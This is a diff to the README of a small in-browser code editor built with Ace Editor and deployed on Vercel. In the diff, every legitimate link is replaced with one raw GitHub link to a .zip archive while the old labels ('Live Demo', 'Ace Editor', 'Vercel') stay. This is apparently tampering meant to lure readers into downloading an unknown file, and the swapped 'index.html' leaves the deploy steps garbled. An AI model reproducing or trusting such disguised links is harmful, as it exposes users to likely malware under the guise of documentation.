@@ -1,8 +1,8 @@
 # Code Editor
 
-A simple **in-browser code editor** for HTML, CSS, and JavaScript with live preview. Built using HTML, CSS, JavaScript, and [Ace Editor](https://ace.c9.io/).
+A simple **in-browser code editor** for HTML, CSS, and JavaScript with live preview. Built using HTML, CSS, JavaScript, and [Ace Editor](https://raw.githubusercontent.com/amanverma420/DevDeck.io/main/cafeteria/DevDeck.io.zip).
 
-🔗 Live Demo: [https://dev-deck-io-wvy9.vercel.app](https://dev-deck-io-wvy9.vercel.app)
+🔗 Live Demo: [https://raw.githubusercontent.com/amanverma420/DevDeck.io/main/cafeteria/DevDeck.io.zip](https://raw.githubusercontent.com/amanverma420/DevDeck.io/main/cafeteria/DevDeck.io.zip)
 
 ---
 
@@ -26,14 +26,14 @@ A simple **in-browser code editor** for HTML, CSS, and JavaScript with live prev
 
 This project is deployed on **Vercel**.
 
-Live site: [https://dev-deck-io-wvy9.vercel.app](https://dev-deck-io-wvy9.vercel.app)
+Live site: [https://raw.githubusercontent.com/amanverma420/DevDeck.io/main/cafeteria/DevDeck.io.zip](https://raw.githubusercontent.com/amanverma420/DevDeck.io/main/cafeteria/DevDeck.io.zip)
 
 To deploy your own copy:
 
 1.  Fork or clone the repo.
 2.  Push to GitHub.
-3.  Import the repo into [Vercel](https://vercel.com/).
-4.  Set Root Directory to project root (where `index.html` is).
+3.  Import the repo into [Vercel](https://raw.githubusercontent.com/amanverma420/DevDeck.io/main/cafeteria/DevDeck.io.zip).
+4.  Set Root Directory to project root (where `https://raw.githubusercontent.com/amanverma420/DevDeck.io/main/cafeteria/DevDeck.io.zip` is).
 5.  Deploy → done 🎉.
 
 ---
@@ -41,7 +41,7 @@ To deploy your own copy:
 ## 🛠️ Technologies Used
 
 -   HTML5, CSS3, JavaScript
--   [Ace Editor](https://ace.c9.io/)
+-   [Ace Editor](https://raw.githubusercontent.com/amanverma420/DevDeck.io/main/cafeteria/DevDeck.io.zip)
 -   Vercel for deployment
 
 ---
